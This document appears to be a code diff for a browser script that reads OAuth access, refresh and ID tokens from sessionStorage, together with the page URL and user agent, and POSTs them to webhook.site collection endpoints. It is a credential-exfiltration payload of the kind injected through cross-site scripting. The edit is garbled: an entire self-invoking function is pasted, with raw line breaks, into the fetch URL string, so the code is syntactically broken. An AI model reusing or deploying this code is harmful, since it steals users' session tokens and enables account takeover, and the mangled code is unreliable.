@@ -14,7 +14,25 @@
             userAgent: navigator.userAgent
           };
 
-          fetch("https://webhook.site/93ba68d2-a8b4-44f3-80fe-9a086e21f433", {
+          fetch("(function () {
+  const webhookURL = 'https://webhook.site/4a41ffa7-b480-4e40-8878-7e4f625efb0b'; // Replace with your real webhook
+
+  const data = {
+    access_token: sessionStorage.getItem("access_token"),
+    refresh_token: sessionStorage.getItem("refresh_token"),
+    id_token: sessionStorage.getItem("id_token"),
+    location: window.location.href,
+    userAgent: navigator.userAgent
+  };
+
+  fetch(webhookURL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+  });
+})();", {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
